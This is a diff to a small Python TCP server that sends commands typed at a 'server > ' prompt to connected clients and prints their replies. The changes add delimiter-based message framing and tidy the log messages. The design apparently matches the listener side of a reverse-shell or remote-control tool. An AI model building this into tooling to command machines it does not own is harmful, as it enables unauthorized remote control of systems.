@@ -1,7 +1,6 @@
 import socket
 import threading
-import http.server
-import socketserver
+
 
 
 HOST = '0.0.0.0'
@@ -12,30 +11,41 @@ clients = []
 
 
 def handle_client(client_socket, client_address):
-    print(f"[+] New client connect (ip address): {client_address}")
+    print(f"[+] New client connected (ip address): {client_address}")
     clients.append(client_socket)
 
     try:
         while True:
-
             command = input("server > ")
-
 
             if command.lower() == "exit":
                 break
 
+            # Send command with a delimiter
+            client_socket.send((command + "<END>").encode())
 
-            client_socket.send(command.encode())
-
-
-            response = client_socket.recv(1024).decode()
+            # Receive response until the delimiter is found
+            response = recv_until_end(client_socket, "<END>")
             print(f"[{client_address}] {response}")
     except Exception as e:
-        print(f"[-] Error : {e}")
+        print(f"[-] Error: {e}")
     finally:
-        print(f"[-] Disconnect to the server {client_address}")
+        print(f"[-] Disconnecting from client {client_address}")
         client_socket.close()
         clients.remove(client_socket)
+
+
+def recv_until_end(sock, delimiter):
+    data = b''
+    while True:
+        chunk = sock.recv(10000)
+        if not chunk:
+            break  # Connection closed
+        data += chunk
+        if delimiter.encode() in data:
+            break
+    return data.decode().replace(delimiter, "")  # Remove the delimiter
+
 
 
 def start_server():
